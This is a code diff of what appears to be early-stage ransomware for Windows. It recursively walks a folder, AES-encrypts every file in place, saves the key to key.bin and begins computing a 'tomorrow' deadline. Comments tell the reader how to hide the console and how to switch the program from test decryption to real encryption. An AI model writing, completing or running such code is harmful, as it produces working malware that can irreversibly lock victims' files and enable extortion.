@@ -2,33 +2,17 @@
 #include <stdio.h>
 #include <stdint.h>
 #include <stdlib.h>
+#include <fileapi.h>
+#include <windows.h>
 
 #include "aes.h"
 
-int main() {
-  /// HIDE CONSOLE
-  //FreeConsole();
-
-  /// GENERATE KEY
-  unsigned int cant_files = 0;
-  uint8_t key[32];
-  time_t seed = time(NULL);
-  srand(seed);
-  for (uint8_t i = 0; i < 32; i++)
-    key[i] = rand() % 256;
-
-  FILE* pFile = fopen("key.bin", "wb");
-  fwrite(key, sizeof(uint8_t), 32, pFile);
-  fclose(pFile);
-
-  /// ENCRYPT FILES
-  char fname[32];
-  scanf("%s", fname); // <---
-
+void EncryptFile(char* fname, const uint8_t* key) {
+  printf("%s\n", fname);
   FILE* file = fopen(fname, "rb+");
   fseek(file, 0, SEEK_END);
   uint32_t size = ftell(file);
-/*
+
   // ANSI X9.23 Start
   uint8_t len = AES_BLOCKLEN - size % AES_BLOCKLEN;
   uint8_t* pad = new uint8_t[len];
@@ -39,21 +23,62 @@ int main() {
   delete[] pad;
   size += len;
   // ANSI X9.23 End
-*/
+
   rewind(file);
   uint8_t* input = new uint8_t[size];
   fread(input, 1, size, file);
 
-//  AES_encrypt(key, input, size);
-/*
+  AES_encrypt(key, input, size);
+
+/// COMMENT THE NEXT THREE LINES TO ENCRYPT FILES!!!
   AES_decrypt(key, input, size);
   uint32_t del = input[size - 1];
   size -= del;
-*/
-//  fwrite(input, sizeof(uint8_t), size, pFile);
+/**/
+  fwrite(input, sizeof(uint8_t), size, file);
   delete[] input;
-  fclose(pFile);
+  fclose(file);
+}
 
+void SearchFiles(const char* sDir, const uint8_t* key) {
+    WIN32_FIND_DATA fdFile;
+    HANDLE hFind = NULL;
+    char sPath[1024];
+    sprintf(sPath, "%s\\*.*", sDir); // Specify a file mask
+    hFind = FindFirstFile(sPath, &fdFile);
+    do {
+        if (strcmp(fdFile.cFileName, ".") != 0 && strcmp(fdFile.cFileName, "..") != 0) {
+            //Build up file path
+            sprintf(sPath, "%s\\%s", sDir, fdFile.cFileName);
+            // Is the entity a File or Folder?
+            if (fdFile.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+                SearchFiles(sPath, key); // Recursion
+            else
+                EncryptFile(sPath, key);
+        }
+    } while (FindNextFile(hFind, &fdFile)); // Find the next file.
+    FindClose(hFind); // Clean
+}
+
+int main() {
+  /// HIDE CONSOLE
+  // Delete the next two slashes to hide console:
+  //FreeConsole();
+
+  /// GENERATE KEY
+  unsigned int cant_files = 0;
+  uint8_t key[32];
+  time_t seed = time(NULL);
+  srand(seed);
+  for (uint8_t i = 0; i < 32; i++)
+    key[i] = rand() % 256;
+
+  FILE* kfile = fopen("key.bin", "wb");
+  fwrite(key, sizeof(uint8_t), 32, kfile);
+  fclose(kfile);
+
+  /// ENCRYPT FILES
+  SearchFiles("testfolder", key); // Encrypt Files in this folder and subfolders
 
   /// GET TIME GMT OF TOMORROW
   unsigned int daysinmon[13] = {0, 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31};
